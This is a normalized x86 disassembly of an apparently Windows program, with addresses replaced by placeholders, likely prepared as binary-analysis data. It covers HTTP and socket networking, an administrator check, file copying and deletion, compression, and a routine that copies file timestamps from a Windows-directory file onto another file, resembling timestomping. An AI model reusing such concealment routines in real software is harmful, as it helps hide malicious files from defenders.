mov edi eax
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push [ esp + 0xc ]
push edi
push [ esp + 0x10 ]
push esi
call [ HttpAddRequestHeadersA@IAT ]
jmp r-xdata
mov eax [ esi + 0x1430 ]
mov ecx 0x1000
sub ecx eax
cmp ecx edi
jge r-xdata
mov eax [ esp + 0x8 ]
lea ecx [ eax + 0x1 ]
pop edi
retn 0x8
push edi
push [ esp + 0xc ]
lea eax [ eax + esi + 0x430 ]
push eax
call sub_2013e10
add [ esi + 0x1430 ] edi
xor eax eax
add esp 0xc
inc eax
xor eax eax
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov edi eax
sub_20056f7
push ebp
lea ebp [ esp - 0x6c ]
xor eax eax
inc eax
sub esp 0x4c0
cmp [ rw-data ] eax
jne r-xdata
push esi
push edi
push 0x3f
mov [ ebp + 0x7c ] eax
xor esi esi
lea eax [ ebp - 0x53 ]
push esi
push eax
mov [ ebp - 0x54 ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp + 0x2d ]
push esi
push eax
mov [ ebp + 0x2c ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0x13 ]
push esi
push eax
mov [ ebp - 0x14 ] 0x0
call sub_2013580
add esp 0x24
mov [ ebx + 0x1430 ] esi
push 0x5
mov edi r--data
lea esi [ ebx + 0x8 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
push [ ebp + 0x7c ]
push [ ebp + 0x78 ]
push [ ebp + 0x74 ]
push ebx
call [ HttpEndRequestA@IAT ]
jmp r-xdata
mov eax [ ebp + 0x7c ]
push 0x12c
call [ Sleep@IAT ]
jmp r-xdata
add ebp 0x6c
leave
retn 0xc
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x454 ]
push 0x400
call sub_20059ff
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x454 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebx + 0x1434 ] 0x1
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x454 ]
push r--data
push eax
call sub_200a1e4
push r--data
xor esi esi
push esi
call sub_200a1e4
add esp 0x10
cmp eax esi
jne r-xdata
pop edi
pop esi
push eax
call sub_200a075
pop ecx
cmp eax 0xc8
je r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
lea eax [ ebp - 0x54 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp + 0x2c ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x454 ]
push 0x400
call sub_20059ff
add esp 0x20
jmp r-xdata
mov [ ebp + 0x7c ] esi
test eax eax
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x454 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0xe
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x454 ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
push 0x1a
lea eax [ ebp + 0x2c ]
push eax
lea eax [ ebp - 0x454 ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x445 ]
push eax
call sub_200a046
pop ecx
mov [ ebx + 0x42c ] eax
jmp r-xdata
push 0x11
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x454 ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebx + 0x428 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x454 ]
push 0x400
call sub_20059ff
pop ecx
pop ecx
mov [ ebx + 0x1434 ] 0x1
sub_2005909
xor eax eax
inc eax
cmp [ rw-data ] eax
jne r-xdata
cmp [ esi + 0x428 ] eax
je r-xdata
push r--data
call sub_20047f9
pop ecx
test eax eax
jne r-xdata
xor eax eax
retn
mov ecx [ esi + 0x42c ]
mov [ ebx ] ecx
mov [ edi ] 0x4
retn
push 0x0
push edi
push ebx
push 0x20000005
push esi
call eax
retn
sub_2005969
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov edi eax
call sub_200594a
test eax eax
jge r-xdata
push [ ebp + 0x8 ]
call inet_addr
mov esi eax
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call gethostbyname
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push 0x6
push 0x1
push 0x2
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ edi ] esi
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
push ecx
push [ eax ]
lea eax [ ebp - 0x4 ]
push eax
call sub_2013e10
mov esi [ ebp - 0x4 ]
add esp 0xc
push 0x2
pop eax
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x10 ] esi
call [ htons@IAT ]
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
call [ rw-data ]
inc eax
neg eax
sbb eax eax
and eax edi
sub_20059ff
push ebx
push edi
xor edi edi
cmp [ esp + 0xc ] edi
jle r-xdata
mov eax [ esp + 0xc ]
mov [ esi + eax ] 0x0
push 0x0
push 0x1
lea ebx [ edi + esi ]
push ebx
push [ esp + 0x1c ]
call [ rw-data ]
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx ] 0xa
je r-xdata
pop edi
pop ebx
retn
mov [ edi + esi + 0x1 ] 0x0
jmp r-xdata
inc edi
cmp edi [ esp + 0xc ]
jl r-xdata
mov eax esi
sub_2005a43
push ebp
mov ebp esp
sub esp 0x400
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x400 ]
push eax
call sub_200b367
add esp 0xc
push 0x0
push eax
lea eax [ ebp - 0x400 ]
push eax
push [ ebp + 0x8 ]
call [ rw-data ]
leave
retn
sub_2005a80
sub esp 0x18
call sub_2005b60
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_2005c10
add esp 0x8
test eax eax
jge r-xdata
call sub_2005bc0
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_2005bc0
sub_2005af0
sub esp 0x18
call sub_2005b60
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_2005db0
add esp 0x8
test eax eax
jge r-xdata
call sub_2005bc0
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_2005bc0
sub_2005b60
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
push 0x4e74
call sub_2009eef
mov esi eax
push 0x4e74
mov [ rw-data ] esi
call sub_2009eef
mov edi eax
push 0x139d
mov [ rw-data ] edi
call sub_2009eef
add esp 0xc
mov [ rw-data ] eax
test esi esi
je r-xdata
xor eax eax
retn
pop edi
or eax 0xffffffff
pop esi
retn
test edi edi
je r-xdata
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_2005bc0
mov eax [ rw-data ]
push eax
call sub_2009d98
mov ecx [ rw-data ]
push ecx
call sub_2009d98
mov edx [ rw-data ]
push edx
call sub_2009d98
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_2005c10
push ecx
push ebx
push ebp
mov ebp [ rw-data ]
push esi
push edi
test ebp ebp
jne r-xdata
or eax 0xffffffff
mov ecx 0x139d
mov edi ebp
[ edi ]
mov edi [ esp + 0x18 ]
mov eax [ edi + 0x8 ]
cmp [ edi + 0x4 ] eax
mov esi 0x100
mov [ esp + 0x10 ] esi
jg r-xdata
call sub_2005b60
mov ebp [ rw-data ]
mov ecx [ edi ]
movzx ecx [ ecx + eax ]
inc eax
mov [ edi + 0x8 ] eax
or ecx 0xffffffff
jmp r-xdata
mov esi [ esp + 0x1c ]
call sub_2006060
mov eax 0xfff
call sub_2006060
xor eax eax
call sub_2006060
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov edx [ edi ]
movzx ebx [ edx + ecx ]
inc ecx
mov [ edi + 0x8 ] ecx
cmp ebx 0xffffffff
je r-xdata
mov eax ecx
lea esp [ esp ]
mov ecx ebx
shl ecx 0x4
xor ecx eax
jne r-xdata
mov edx 0x139d
sub edx ecx
lea edx [ ecx + 0x1 ]
jmp r-xdata
mov edx [ ebp + ecx * 4 ]
cmp edx 0xffffffff
je r-xdata
jmp r-xdata
cmp [ ebp + ecx * 4 ] 0xffffffff
je r-xdata
cmp esi 0xffe
ja r-xdata
mov eax edx
jmp r-xdata
mov edi [ rw-data ]
cmp [ edi + ecx * 4 ] eax
jne r-xdata
mov esi [ esp + 0x1c ]
call sub_2006060
test eax eax
jl r-xdata
mov edx [ rw-data ]
mov [ ebp + ecx * 4 ] esi
mov [ edx + ecx * 4 ] eax
mov edx [ rw-data ]
inc esi
mov [ esp + 0x10 ] esi
mov [ edx + ecx ] bl
mov ecx [ edi + 0x8 ]
cmp [ edi + 0x4 ] ecx
jle r-xdata
sub ecx edx
jns r-xdata
mov edi [ rw-data ]
movzx edi [ edi + ecx ]
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
mov esi [ esp + 0x10 ]
mov eax ebx
jmp r-xdata
cmp [ ebp + ecx * 4 ] 0xffffffff
jne r-xdata
add ecx 0x139d
mov edi [ esp + 0x18 ]
sub_2005d50
mov eax [ esp + 0x4 ]
shl eax 0x4
xor eax ebx
jne r-xdata
mov edx 0x139d
sub edx eax
lea edx [ eax + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov esi [ rw-data ]
mov edi [ rw-data ]
mov ecx [ rw-data ]
cmp [ ecx + eax * 4 ] 0xffffffff
push ebp
push esi
push edi
je r-xdata
sub eax edx
jns r-xdata
movzx ebp [ edi + eax ]
cmp ebp [ esp + 0x10 ]
je r-xdata
cmp [ ecx + eax * 4 ] 0xffffffff
jne r-xdata
add eax 0x139d
cmp [ esi + eax * 4 ] ebx
jne r-xdata
sub_2005db0
sub esp 0x14
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x100
call sub_2005ff0
mov ecx [ esp + 0x2c ]
mov edx eax
mov eax [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] edx
jle r-xdata
call sub_2005b60
call sub_2005ff0
mov edi eax
mov [ esp + 0x1c ] edi
cmp edi 0xfff
je r-xdata
mov esi [ ecx ]
mov [ eax + esi ] dl
inc eax
mov [ ecx + 0x8 ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ebp [ rw-data ]
mov ebx [ rw-data ]
mov ecx edi
mov edx rw-data
cmp edi 0xff
jbe r-xdata
mov ecx [ esp + 0x18 ]
mov al [ esp + 0x10 ]
mov [ rw-data ] al
mov edx rw-data
cmp ecx 0xff
jbe r-xdata
mov [ edx ] cl
movzx ecx [ edx ]
mov [ esp + 0x10 ] ecx
cmp edx rw-data
jb r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0x14 ]
cmp eax 0xffe
ja r-xdata
mov eax [ esp + 0x2c ]
mov esi [ eax + 0x4 ]
lea esp [ esp ]
push r--data
call sub_200b54d
add esp 0x4
push 0xfffffffd
call sub_200b9cf
cmp ecx 0xff
ja r-xdata
cmp ecx 0xff
ja r-xdata
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x28 ]
call sub_2005ff0
mov edi eax
mov [ esp + 0x1c ] eax
cmp edi 0xfff
jne r-xdata
mov ecx [ esp + 0x18 ]
mov dl [ esp + 0x10 ]
mov [ ebp + eax * 4 ] ecx
mov [ ebx + eax ] dl
inc eax
mov [ esp + 0x14 ] eax
mov eax [ eax ]
mov edi [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
inc ecx
mov [ eax + 0x8 ] ecx
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
jmp r-xdata
xor esi esi
cmp edi [ esp + 0x14 ]
jb r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp edx rw-data
jae r-xdata
dec edx
test ecx ecx
jl r-xdata
mov ecx [ eax + 0x8 ]
cmp esi ecx
jg r-xdata
sub_2005f50
push ebp
push esi
xor esi esi
push edi
cmp ecx 0xff
jbe r-xdata
pop edi
pop esi
mov [ eax ] cl
pop ebp
retn
mov edi [ rw-data ]
mov ebp [ rw-data ]
lea esp [ esp ]
push r--data
call sub_200b54d
add esp 0x4
push 0xfffffffd
call sub_200b9cf
int3
cmp ecx 0xff
ja r-xdata
mov dl [ edi + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ eax ] dl
mov edx esi
inc eax
inc esi
cmp edx 0xffe
jge r-xdata
sub_2005ff0
mov edx [ rw-data ]
cmp edx 0x18
push ebx
mov ebx [ rw-data ]
jg r-xdata
mov eax ebx
shl ebx 0xc
sub edx 0xc
mov [ rw-data ] ebx
shr eax 0x14
mov [ rw-data ] edx
pop ebx
retn
push ebp
mov ebp [ edi + 0x4 ]
push esi
mov esi [ edi + 0x8 ]
lea ebx [ ebx ]
mov eax [ edi ]
movzx eax [ eax + esi ]
inc esi
or eax 0xffffffff
jmp r-xdata
cmp ebp esi
jg r-xdata
mov [ edi + 0x8 ] esi
pop esi
pop ebp
mov ecx 0x18
sub ecx edx
shl eax cl
add edx 0x8
or ebx eax
cmp edx 0x18
jle r-xdata
sub_2006060
mov edx [ rw-data ]
mov ecx 0x14
sub ecx edx
push ebx
shl eax cl
push ebp
push edi
mov edi [ rw-data ]
add edx 0xc
or edi eax
cmp edx 0x8
mov [ rw-data ] edi
mov [ rw-data ] edx
jl r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
retn
mov ebp [ esi + 0x4 ]
mov [ rw-data ] edi
pop edi
pop ebp
mov [ rw-data ] edx
or eax 0xffffffff
pop ebx
retn
mov ebx [ esi ]
mov ecx edi
shr ecx 0x18
mov [ eax + ebx ] cl
inc eax
sub edx 0x8
shl edi 0x8
cmp edx 0x8
mov [ esi + 0x8 ] eax
jge r-xdata
mov eax [ esi + 0x8 ]
cmp ebp eax
jle r-xdata
mov [ rw-data ] edx
mov [ rw-data ] edi
sub_20060e0
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
xor ebx ebx
lea eax [ esp + 0x8 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x5
call [ AllocateAndInitializeSid@IAT ]
mov [ esp + 0x4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x14
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_2006170
sub esp 0xa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x9c ] eax
push esi
push 0x9c
lea eax [ esp + 0x8 ]
push 0x0
push eax
call sub_2013580
mov esi [ GetVersionExA@IAT ]
add esp 0xc
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0x8 ] 0x9c
call esi
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] 0x2
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
mov [ esp + 0x8 ] 0x94
call esi
test eax eax
je r-xdata
mov ecx [ esp + 0xa0 ]
pop esi
xor ecx esp
xor eax eax
call sub_200b53e
add esp 0xa0
retn
cmp [ esp + 0x8 ] 0x6
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ esp + 0x9c ]
xor ecx esp
call sub_200b53e
add esp 0xa0
retn
sub_2006210
sub esp 0xa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x9c ] eax
push esi
push 0x9c
lea eax [ esp + 0x8 ]
push 0x0
push eax
call sub_2013580
mov esi [ GetVersionExA@IAT ]
add esp 0xc
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0x8 ] 0x9c
call esi
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] 0x2
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
mov [ esp + 0x8 ] 0x94
call esi
test eax eax
je r-xdata
xor eax eax
cmp [ esp + 0x8 ] 0x5
jne r-xdata
mov eax 0x1
cmp [ esp + 0xc ] eax
je r-xdata
mov ecx [ esp + 0xa0 ]
pop esi
xor ecx esp
call sub_200b53e
add esp 0xa0
retn
sub_20062e0
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x0
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
retn
or eax eax
pop esi
retn
sub_2006330
push edi
push esi
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
retn
push eax
push edi
push esi
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
push esi
call [ DeleteFileA@IAT ]
sub_2006370
sub esp 0x104
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x100 ] eax
push ebp
mov ebp [ esp + 0x10c ]
push edi
mov edi [ CreateDirectoryA@IAT ]
push 0x0
push ebp
call edi
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebp
sub edx ebp
pop edi
mov eax 0x1
pop ebp
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
dec eax
test eax eax
jle r-xdata
pop edi
xor eax eax
pop ebp
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
cmp [ esp + eax + 0x8 ] 0x5c
je r-xdata
mov [ esp + eax + 0x8 ] 0x0
test eax eax
jle r-xdata
dec eax
test eax eax
jg r-xdata
push 0x0
lea eax [ esp + 0xc ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
push 0x0
lea ecx [ esp + 0x10 ]
sub eax edx
push ecx
mov [ esp + eax + 0x14 ] 0x5c
call edi
test eax eax
je r-xdata
pop esi
pop edi
xor eax eax
pop ebp
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
lea eax [ esp + 0xc ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx eax
mov eax ebp
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x10c ]
pop esi
pop edi
pop ebp
xor ecx esp
mov eax 0x1
call sub_200b53e
add esp 0x104
retn
lea eax [ esp + 0xc ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x0
lea edx [ esp + 0x10 ]
push edx
mov [ esp + eax + 0x14 ] 0x5c
call edi
test eax eax
jne r-xdata
sub_20064d0
sub esp 0x208
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x204 ] eax
push ebp
push esi
push 0xff
lea eax [ esp + 0xd ]
push 0x0
push eax
mov esi ecx
mov [ esp + 0x14 ] 0x0
call sub_2013580
mov ebp [ CreateDirectoryA@IAT ]
add esp 0xc
push 0x0
push esi
call ebp
test eax eax
jne r-xdata
mov ecx [ esp + 0x20c ]
pop esi
pop ebp
xor ecx esp
mov eax 0x1
call sub_200b53e
add esp 0x208
retn
lea edx [ esp + 0x108 ]
mov eax esi
sub edx esi
nop
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea ecx [ esp + 0x108 ]
push r--data
push ecx
call sub_200bc6e
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x8 ]
sub edx eax
pop esi
pop ebp
mov ecx [ esp + 0x204 ]
xor ecx esp
call sub_200b53e
add esp 0x208
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
push ebx
mov ebx [ GetFileAttributesA@IAT ]
push edi
push 0x0
lea eax [ esp + 0x14 ]
push eax
call ebp
test al 0x10
jne r-xdata
pop edi
pop ebx
lea edi [ esp + 0x10 ]
dec edi
push r--data
push 0x0
call sub_200bc6e
add esp 0x8
test eax eax
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov cx [ r--data ]
mov [ edi ] cx
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea edx [ esp + 0x10 ]
push edx
call ebx
cmp eax 0xffffffff
je r-xdata
sub_2006670
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
retn
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0xc0000000
push esi
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
retn
sub_20066b0
sub esp 0x20
xor eax eax
mov [ esp ] eax
mov [ esp + 0xc ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp ] eax
or eax 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] r--data
test ecx ecx
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
lea edx [ esp ]
push edx
mov [ esp + 0x18 ] sub_2006730
mov [ rw-data ] eax
mov [ rw-data ] ecx
call [ SHBrowseForFolderA@IAT ]
test eax eax
je r-xdata
mov [ esp + 0xc ] ecx
xor eax eax
add esp 0x20
retn
mov ecx [ esp + 0x24 ]
push ecx
push eax
call [ SHGetPathFromIDListA@IAT ]
mov eax 0x1
add esp 0x20
retn
sub_2006730
sub esp 0x208
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x204 ] eax
mov eax [ esp + 0x210 ]
sub eax 0x1
push esi
mov esi [ esp + 0x218 ]
push edi
mov edi [ esp + 0x214 ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x1
jne r-xdata
push 0x3743
push edi
call [ GetDlgItem@IAT ]
mov esi eax
push 0xffffffec
push esi
call [ GetWindowLongA@IAT ]
or eax 0x20000
push eax
push 0xffffffec
push esi
call [ SetWindowLongA@IAT ]
push 0x23
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ SetWindowPos@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
push edi
call [ SetWindowTextA@IAT ]
mov ecx [ esp + 0x20c ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_200b53e
add esp 0x208
retn 0x10
push 0x103
push eax
mov [ esp + 0x10 ] al
lea eax [ esp + 0x11 ]
push eax
call sub_2013580
add esp 0xc
lea ecx [ esp + 0x8 ]
push ecx
push esi
call [ SHGetPathFromIDListA@IAT ]
lea edx [ esp + 0x8 ]
push edx
push 0x0
push 0x464
jmp r-xdata
push eax
lea eax [ esp + 0x10c ]
push eax
push 0x100
call [ GetCurrentDirectoryA@IAT ]
lea ecx [ esp + 0x10c ]
push ecx
jmp r-xdata
push edi
call [ SendMessageA@IAT ]
push 0x1
push 0x466
sub_2006840
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
push 0x0
call sub_200b148
mov ecx [ esp + 0x18 ]
add esp 0x4
mov edi eax
mov eax [ esp + 0x18 ]
push 0x8
push eax
push ecx
mov ebx edx
call [ FindFirstChangeNotificationA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
test ebp ebp
jge r-xdata
pop edi
or eax eax
or edx esi
pop esi
pop ebp
pop ebx
retn
imul ebp ebp 0x3e8
push ebp
push 0xffffffff
jmp r-xdata
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ FindCloseChangeNotification@IAT ]
push 0x0
call sub_200b148
add esp 0x4
sub eax edi
pop edi
pop esi
pop ebp
sbb edx ebx
pop ebx
retn
sub_20068b0
sub esp 0x258
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x254 ] eax
mov eax [ esp + 0x25c ]
push ebx
push esi
push edi
mov [ esp + 0x14 ] ecx
test eax eax
je r-xdata
push 0x104
lea edx [ esp + 0x5c ]
push edx
call [ GetWindowsDirectoryA@IAT ]
lea ebx [ esp + 0x15c ]
call sub_2007bf0
lea edi [ esp + 0x58 ]
dec edi
mov edi edi
mov ecx eax
lea esi [ ecx + 0x1 ]
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ax [ r--data ]
mov [ edi ] ax
lea eax [ esp + 0x15c ]
mov edx eax
lea ebx [ ebx ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x58 ]
sub eax edx
dec edi
mov edi edi
sub ecx esi
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edx [ esp + 0x58 ]
sub edx eax
mov ecx [ esp + 0x260 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x258
retn
push ebp
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push esi
call [ GetFileTime@IAT ]
mov ebx [ CloseHandle@IAT ]
mov ebp [ Sleep@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push esi
call ebx
push 0x64
call ebp
push esi
call ebx
mov edx [ esp + 0x18 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x40000000
push edx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edi [ CreateFileA@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
lea ecx [ esp + 0x70 ]
push ecx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop ebp
mov edi [ FileTimeToSystemTime@IAT ]
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
call edi
lea edx [ esp + 0x4c ]
push edx
lea eax [ esp + 0x14 ]
push eax
call edi
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x20 ]
push edx
call edi
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x2c ]
push edx
push esi
call [ SetFileTime@IAT ]
test eax eax
je r-xdata
push esi
